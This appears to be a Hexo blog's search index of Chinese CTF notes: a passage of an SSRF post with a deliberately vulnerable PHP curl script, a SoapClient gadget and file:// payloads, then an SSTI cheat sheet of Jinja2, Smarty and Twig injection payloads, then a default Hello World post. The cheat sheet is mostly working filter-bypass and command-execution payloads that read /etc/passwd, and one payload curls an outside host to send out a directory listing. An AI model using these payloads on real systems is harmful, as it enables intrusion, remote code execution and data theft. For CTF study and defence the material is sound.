和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页</p><p>也可以使用file协议读取本地文件</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p>SOAP是简单对象访问协议，简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。PHP 的 SoapClient 就是可以基于SOAP协议可专门用来访问 WEB 服务的 PHP 客户端。</p><p>SoapClient是一个php的内置类，当其进行反序列化时，如果触发了该类中的 <code>__call</code> 方法，那么 <code>__call</code> 便方法可以发送HTTP和HTTPS请求。该类的构造函数如下：</p><pre class="line-numbers language-none"><code class="language-none">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>第一个参数是用来指明是否是wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而 uri 是SOAP服务的目标命名空间。</li></ul><p>知道上述两个参数的含义后，就很容易构造出SSRF的利用Payload了。我们可以设置第一个参数为null，然后第二个参数为一个包含location和uri的数组，location选项的值设置为target_url：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php$a = new SoapClient(null,array('uri'=&gt;'http://47.xxx.xxx.72:2333', 'location'=&gt;'http://47.xxx.xxx.72:2333/aaa'));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a();    // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>47.xxx.xxx.72监听2333端口，访问ssrf.php，即可在47.xxx.xxx.72上得到访问的数据：</p><p>由于它仅限于http/https协议，所以用处不是很大。但是如果这里的http头部还存在crlf漏洞，那么我们就可以进行ssrf+crlf，注入或修改一些http请求头，详情请看：<a href="https://www.anquanke.com/post/id/202025">《SoapClient+crlf组合拳进行SSRF》</a></p><h3 id="三·SSRF漏洞利用的相关协议"><a href="#三·SSRF漏洞利用的相关协议" class="headerlink" title="三·SSRF漏洞利用的相关协议"></a><strong>三·SSRF漏洞利用的相关协议</strong></h3><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><p>下面我们对这些协议的利用进行逐一演示。</p><h4 id="常见利用方式（file、http-s和dict协议）"><a href="#常见利用方式（file、http-s和dict协议）" class="headerlink" title="常见利用方式（file、http/s和dict协议）"></a>常见利用方式（file、http/s和dict协议）</h4><p>SSRF的利用主要就是读取内网文件、探测内网主机存活、扫描内网端口、攻击内网其他应用等，而这些利用的手法无一不与这些协议息息相关。</p><p>以下几个演示所用的测试代码：</p><pre class="line-numbers language-none"><code class="language-none">// ssrf.php&lt;?php if (isset($_GET['url'])){$link = $_GET['url'];$curlobj = curl_init(); // 创建新的 cURL 资源curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); // 设置 URL 和相应的选项$result=curl_exec($curlobj); // 抓取 URL 并把它传递给浏览器curl_close($curlobj); // 关闭 cURL 资源，并且释放系统资源 // $filename = './curled/'.rand().'.txt';// file_put_contents($filename, $result); echo $result;}?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="读取内网文件（file协议）"><a href="#读取内网文件（file协议）" class="headerlink" title="读取内网文件（file协议）"></a>读取内网文件（file协议）</h5><p>我们构造如下payload，即可将服务器上的本地文件及网站源码读取出来：</p><pre class="line-numbers language-none"><code class="language-none">ssrf.php?url=file:///etc/passwdssrf.php?url=file:///var/www/html/flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="探测内网主机存活（http-s协议）"><a href="#探测内网主机存活（http-s协议）" class="headerlink" title="探测内网主机存活（http/s协议）"></a>探测内网主机存活（http/s协议）</h5><p>一般是先想办法得到目标主机的网络配置信息，如读取/etc/hosts、/proc/net/arp、/proc/net/fib_trie等文件，从而获得目标主机的内网网段并进行爆破。</p><p>域网IP地址范围分三类，以下IP段为内网IP段：</p><pre class="line-numbers language-none"><code class="language-none">C类：192.168.0.0 - 192.168.255.255 B类：172.16.0.0 - 172.31.255.255 A类：10.0.0.0 - 10.255.255.255<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试环境如下：</p>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF SSTI</title>
      <link href="/2021/07/27/ctf-ssti/"/>
      <url>/2021/07/27/ctf-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-SSTI-服务器模板注入"><a href="#CTF-SSTI-服务器模板注入" class="headerlink" title="CTF SSTI(服务器模板注入)"></a><strong>CTF SSTI(服务器模板注入)</strong></h1><h3 id="一丶基本判断"><a href="#一丶基本判断" class="headerlink" title="一丶基本判断"></a><strong>一丶基本判断</strong></h3><p><img src="https://i.loli.net/2021/07/28/hYPU4l68D7xAg9Z.png"></p><hr><h3 id="二丶渲染模板（flask-jinja）"><a href="#二丶渲染模板（flask-jinja）" class="headerlink" title="二丶渲染模板（flask/jinja）"></a><strong>二丶渲染模板（flask/jinja）</strong></h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><table><thead><tr><th align="left"><strong>dict</strong></th><th>保存类实例或对象实例的属性变量键值对字典</th></tr></thead><tbody><tr><td align="left"><strong>class</strong></td><td>返回类型所属的对象</td></tr><tr><td align="left"><strong>mro</strong></td><td>返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</td></tr><tr><td align="left">bases</td><td>返回该对象所继承的基类</td></tr><tr><td align="left"><strong>subclasses</strong></td><td>每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</td></tr><tr><td align="left"><strong>init</strong></td><td>类的初始化方法</td></tr><tr><td align="left">globals</td><td>对包含函数全局变量的字典的引用</td></tr></tbody></table><h5 id="一些姿势"><a href="#一些姿势" class="headerlink" title="一些姿势"></a><strong>一些姿势</strong></h5><ul><li><p>[浅析SSTI(python沙盒绕过)]: </p></li><li><p><strong>config</strong></p><p><code>{{config}}</code>可以获取当前设置，如果题目类似<code>app.config ['FLAG'] = os.environ.pop（'FLAG'）</code>，那可以直接访问<code>{{config['FLAG']}}</code>或者<code>{{config.FLAG}}</code>得到flag</p></li><li><p><strong>self</strong></p><pre class="line-numbers language-none"><code class="language-none">{{self\}\} ⇒ &lt;TemplateReference None&gt;{{self.__dict__._TemplateReference__context.config}} ⇒ 同样可以找到config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>[]  ()  “”</strong></p><p>主要目的是配合<code>__class__.__mro__[2]</code>这样找到<code>object</code>类<br> <code>{{[].__class__.__base__.__subclasses__()[68].__init__.__globals__['os'].__dict__.environ['FLAG']}}</code></p></li><li><p>url_for,g,request,namespace,lipsum,range,session,dict,get_flashed_message,config</p><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）</p><pre class="line-numbers language-none"><code class="language-none">{{url_for.__globals__['current_app'].config.FLAG}}{{get_flashed_messages.__globals__['current_app'].config.FLAG}}{{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['current_app'].config['FLAG']}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h5 id="常用绕过"><a href="#常用绕过" class="headerlink" title="常用绕过"></a><strong>常用绕过</strong></h5><ol><li><p>以下表示法可用于访问对象的属性：</p><ul><li><code>request.__class__</code></li><li><code>request["__class__"]</code></li><li><code>request|attr("__class__")</code></li></ul></li><li><p>可以使用以下方法访问数组元素：</p><ul><li><code>array[0]</code></li><li><code>array.pop(0)</code></li><li><code>array.__getitem__(2)</code></li></ul></li><li><p>过滤[]和.</p><p>只过滤<code>[]</code>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。<br> <code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()</code><br> 若<code>.</code>也被过滤，使用原生JinJa2函数<code>|attr()</code>将<code>request.__class__</code>改成<code>request|attr("__class__")</code></p></li><li><p>过滤_</p><p>利用<code>request.args</code>属性</p><pre class="line-numbers language-none"><code class="language-none">{{  ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__`<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将其中的<code>request.args</code>改为<code>request.values</code>则利用post的方式进行传参</p></li><li><p>关键词过滤</p><ul><li>base64编码绕过<br> <code>__getattribute__</code>使用实例访问属性时,调用该方法</li></ul><p>​      例如被过滤掉<code>__class__</code>关键词</p><pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40]("/etc/passwd").read()}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>字符串拼接绕过</p><pre class="line-numbers language-none"><code class="language-none">{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}{{[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>过滤  {   {</p><p>使用{ % if … %}1{ % endif  % }，例如</p><pre class="line-numbers language-none"><code class="language-none">{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://http.bin.buuoj.cn/1inhq4f1 -d `ls / |  grep flag`;')%}1{% endif %}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</p><pre class="line-numbers language-none"><code class="language-none">{% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p'%}1{% endif%}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>引号内十六进制绕过</p><pre class="line-numbers language-none"><code class="language-none">{{"".__class__}}{{""["\x5f\x5fclass\x5f\x5f"]}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>_<code>是</code>\x5f<code>，</code>.<code>是</code>\x2E</p></li><li><p>“ ‘ chr等被过滤，无法引入字符串</p><ul><li>直接拼接键名</li></ul><pre class="line-numbers language-none"><code class="language-none">dict(buil=aa,tins=dd)|join()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>利用<code>string</code>、<code>pop</code>、<code>list</code>、<code>slice</code>、<code>first</code>等过滤器从已有变量里面直接找</li></ul><pre class="line-numbers language-none"><code class="language-none">(app.__doc__|list()).pop(102)|string()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>构造出<code>%</code>和<code>c</code>后，用格式化字符串代替<code>chr</code></li></ul><pre class="line-numbers language-none"><code class="language-none">{%set udl=dict(a=pc,c=c).values()|join %}      # uld=%c{%set i1=dict(a=i1,c=udl%(99)).values()|join %}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>+被过滤，无法拼接字符串</p></li></ol><ul><li><code>~</code><br> 在jinja中可以拼接字符串</li><li>格式化字符串<br> 同上</li></ul><hr><h3 id="三丶Smarty"><a href="#三丶Smarty" class="headerlink" title="三丶Smarty"></a><strong>三丶Smarty</strong></h3><p><a href="https://www.jianshu.com/p/eb8d0137a7d3">Smarty SSTI</a></p><ol><li><p>{php}{/php}</p><p>Smarty已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用</p></li><li><p>{literal}</p><p>{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</p><p>那么对于php5的环境我们就可以使用</p><script language="php">phpinfo();</script></li><li><p>{if}</p><p>Smarty的{if}条件判断和PHP的if 非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}. 也可以使用{else} 和 {elseif}. 全部的PHP条件表达式和函数都可以在if内使用，如*||*,or,&amp;&amp;,and,is_array(), 等等</p></li><li><p>getStreamVariable</p><p>新版本失效<br> <code>{self::getStreamVariable("file:///etc/passwd")}</code></p><hr><h3 id="四丶twig"><a href="#四丶twig" class="headerlink" title="四丶twig"></a><strong>四丶twig</strong></h3><p><strong>文件读取</strong></p><pre class="line-numbers language-none"><code class="language-none">{{'/etc/passwd'|file_excerpt(1,30)}}{{app.request.files.get(1).__construct('/etc/passwd','')\}\}{{app.request.files.get(1).openFile.fread(99)\}\}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>rce</strong></p><pre class="line-numbers language-none"><code class="language-none">{{_self.env.registerUndefinedFilterCallback("exec")\}\}\{\{_self.env.getFilter("id")}}{{['cat /etc/passwd']|filter('system')}}POST /subscribe?0=cat+/etc/passwd HTTP/1.1{{app.request.query.filter(0,0,1024,{'options':'system'})}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><hr>]]></content>
      
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2021/07/27/hello-world/"/>
      <url>/2021/07/27/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
